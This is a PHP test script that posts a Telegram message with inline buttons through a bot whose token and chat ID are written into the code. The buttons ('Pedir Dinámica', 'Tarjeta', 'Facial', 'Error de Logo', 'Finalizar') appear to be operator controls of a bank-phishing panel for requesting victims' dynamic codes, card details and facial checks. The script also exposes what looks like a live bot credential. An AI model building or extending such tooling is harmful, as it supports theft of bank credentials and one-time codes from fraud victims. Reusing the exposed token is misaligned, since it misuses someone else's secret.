<?php
// test_buttons.php - Test script to send a message with buttons to Telegram

$botToken = '8649687947:AAF32CCBrBUFPm-C11qsD6acGAnNPoM2dcc';
$chatId = '-5238438739';

$message = "Test message with buttons at " . date('Y-m-d H:i:s');

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Error de Logo', 'callback_data' => "error_logo:test123"],
            ['text' => 'Pedir Dinámica', 'callback_data' => "pedir_dinamica:test123"]
        ],
        [
            ['text' => 'Tarjeta', 'callback_data' => "error_tc:test123"],
            ['text' => 'Facial', 'callback_data' => "facial:test123"]
        ],
        [
            ['text' => 'Finalizar', 'callback_data' => "confirm_finalizar:test123"]
        ]
    ]
];

$payload = json_encode([
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => $keyboard
]);

$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => $payload,
        'timeout' => 10,
        'ignore_errors' => true
    ]
]);

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$response = file_get_contents($url, false, $context);

$http_code = 0;
if (isset($http_response_header[0])) {
    if (preg_match('/HTTP\/\d+\.\d+ (\d+)/', $http_response_header[0], $matches)) {
        $http_code = (int)$matches[1];
    }
}

$result = json_decode($response, true);

echo "HTTP Code: $http_code\n";
echo "Response: " . substr($response, 0, 500) . "\n";
echo "Result: " . json_encode($result) . "\n";

if ($http_code === 200 && $result && isset($result['ok']) && $result['ok']) {
    echo "SUCCESS: Message with buttons sent!\n";
} else {
    echo "ERROR: " . ($result['description'] ?? 'Unknown') . "\n";
}
?>